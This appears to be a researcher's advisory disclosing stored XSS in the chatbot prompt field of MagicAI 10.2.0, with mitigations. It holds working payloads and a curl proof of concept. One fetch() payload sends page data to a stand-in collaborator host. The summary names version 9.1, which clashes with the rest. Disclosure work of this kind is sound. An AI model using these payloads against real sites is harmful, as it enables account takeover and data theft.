## Stored Cross-Site Scripting (XSS) in MagicAI (MagicProject AI) 10.2.0



## Discovered by:
Ahmad Marzouk

## Vendor: LiquidThemes

## Product:
MagicAI (MagicProject AI)

## Affected version: 10.2.0

## Impact: 
Arbitrary JavaScript execution in users’ browsers (stored XSS)

Attack type: Authenticated remote 

Component: AI Chat – “chatbot generation” / Social Media Agent

CWE: CWE-79 (Improper Neutralization of Input During Web Page Generation)

Severity: High

Blast radius: All users/admins who can view generated chatbot content



## Executive Summary (for Decision Makers)



A stored XSS vulnerability in MagicAI 9.1 allows a logged-in administrator to inject HTML/JavaScript into chatbot configuration fields.

The payload becomes permanently stored and executes whenever anyone views the chatbot’s generated output, enabling:



Full account takeover (including other admins)



Forced administrative actions



Data extraction via arbitrary browser-side JavaScript



The issue arises because the chatbot “prompt” field is stored unsanitized and later rendered directly into HTML without escaping.



TL;DR — What’s Exploitable



Endpoint:



POST https://demo.magicproject.ai/dashboard/user/social-media/agent/chat



Parameter:

prompt (multipart/form-data)



Example harmless demo payload:



<details open ontoggle=alert(1)>



Trigger:

Viewing any page that renders the chatbot’s generated content will execute the payload.



Technical Analysis and Reproduction Steps

1. Establish Admin Context



Log in as an administrator.

Navigate to:

Dashboard → user → Chat



MagicAI’s Social Media Agent exposes chatbot-generation fields writable by admins.



2. Identify the Submission Endpoint



Using browser DevTools, observe that creating or updating a chatbot issues a:



POST https://demo.magicproject.ai/dashboard/user/social-media/agent/chat



This includes the vulnerable prompt parameter.



3. Test for Filtering or Sanitization



Submit a harmless test marker, such as:



<i>probe</i>



Then open the chatbot preview or any UI where generated content is shown.

The HTML renders instead of being escaped → unsafe HTML injection confirmed.



4. Escalate to an Event-Bearing HTML Payload



Use an event handler payload that does not rely on <script> (commonly filtered but still dangerous):



<details open ontoggle=alert(1)>



This fires when the chatbot output is rendered.



5. Confirm Persistence (Stored XSS)



Reload the chatbot preview/output page.

The alert appears without user interaction, proving this is stored, not reflected, XSS.



6. Verify Absence of CSP



Response headers show no effective Content-Security-Policy.

Inline event handlers execute unrestricted, magnifying the risk.



7. Safe Demonstration Payload



A benign network request PoC—acceptable during controlled testing:



<details open ontoggle=fetch('https://your-collab.example/xss?q='+encodeURIComponent(location.href))>



This confirms arbitrary JavaScript execution without performing destructive actions.



Reproduction (curl PoC)



Replace cookie and host values with those from your authenticated session. Payload is safe and only shows an alert.



curl -i -sS -k \

  -H 'Cookie: <your_admin_session_cookie>' \

  -H 'Content-Type: multipart/form-data; boundary=----x' \

  --data-binary $'------x\r\nContent-Disposition: form-data; name="prompt"\r\n\r\n<details open ontoggle=alert(1)>\r\n------x--\r\n' \

  https://demo.magicproject.ai/dashboard/user/social-media/agent/chat



Then view the chatbot preview. The alert confirms XSS execution.



Root Cause



User-provided content is stored without sanitization.



The application injects the content directly into an HTML context.



No proper escaping (&, <, >, ", ') is applied.



Inline event handlers are permitted due to lack of CSP.



Rendering path likely uses innerHTML or an equivalent unsafe sink.



Real-World Risks & Abuse Scenarios

Admin-on-Admin Compromise



A rogue admin can silently implant payloads that run for all other admins.



Session Riding / Token Theft



JavaScript can:



Perform privileged actions



Read DOM-exposed tokens (if present)



Change system settings



Exfiltrate data



Tenant-wide Exposure



Any user role permitted to view generated chatbot output becomes a target.



Affected Scope



Confirmed: MagicAI / MagicProject AI version 10.2.0



Potentially affected: All versions where chatbot output is rendered unescaped (not tested)



Mitigations & Vendor Guidance

1. Apply Output Encoding (Primary Fix)



Escape HTML entities before rendering.

Use the templating engine’s auto-escaping by default.



2. Sanitize HTML Inputs



If HTML must be allowed:



Use a strict allow-list sanitizer (e.g., DOMPurify)



Remove all on* event attributes



Block javascript: URLs



Disallow dangerous tags (SVG, MathML, iframes)



3. Enforce a Strong CSP



Example baseline:



default-src 'self'; base-uri 'none'; object-src 'none';

script-src 'nonce-<random>' 'strict-dynamic';

frame-ancestors 'none'; upgrade-insecure-requests;



Adapt to your platform and asset pipeline.



4. Replace Dangerous Rendering Sinks



Avoid:



innerHTML



v-html



Raw template injection



Prefer:



textContent



Safe binding functions



this PoC Video

https://github.com/user-attachments/assets/94b4af8e-bc99-48ec-beb0-9217c9be5018
